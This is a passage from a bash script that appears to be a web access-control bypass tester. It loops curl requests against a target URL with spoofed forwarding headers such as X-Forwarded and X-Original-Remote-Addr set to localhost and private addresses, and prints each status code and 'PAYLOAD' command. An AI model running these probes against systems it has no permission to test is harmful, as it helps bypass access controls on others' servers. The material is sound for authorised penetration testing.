	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Server: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Server Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Server: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Server: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Server Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Server: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Server: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Server Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Server: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Server: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Server Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Server: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Server: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "X-Forwarded Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "X-Forwarder-For Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarder-For: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarder-For: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarder-For Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarder-For: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarder-For: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarder-For Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarder-For: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarder-For: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarder-For Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarder-For: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarder-For: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarder-For Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarder-For: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarder-For: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarder-For Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarder-For: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarder-For: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarder-For Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarder-For: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarder-For: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarder-For Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarder-For: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarder-For: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarder-For Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarder-For: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarder-For: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarder-For Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarder-For: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarder-For: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "X-Http-Destinationurl Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Http-Destinationurl: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Http-Destinationurl: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Http-Destinationurl Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Http-Destinationurl: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Http-Destinationurl: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Http-Destinationurl Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Http-Destinationurl: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Http-Destinationurl: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Http-Destinationurl Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Http-Destinationurl: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Http-Destinationurl: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Http-Destinationurl Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Http-Destinationurl: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Http-Destinationurl: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Http-Destinationurl Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Http-Destinationurl: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Http-Destinationurl: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Http-Destinationurl Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Http-Destinationurl: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Http-Destinationurl: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Http-Destinationurl Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Http-Destinationurl: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Http-Destinationurl: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Http-Destinationurl Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Http-Destinationurl: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Http-Destinationurl: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Http-Destinationurl Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Http-Destinationurl: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Http-Destinationurl: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "X-Http-Host-Override Payload:"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Http-Host-Override: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Http-Host-Override: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	
	echo -n "X-Original-Remote-Addr Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-Remote-Addr: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-Remote-Addr: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Original-Remote-Addr Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-Remote-Addr: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-Remote-Addr: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Original-Remote-Addr Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-Remote-Addr: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
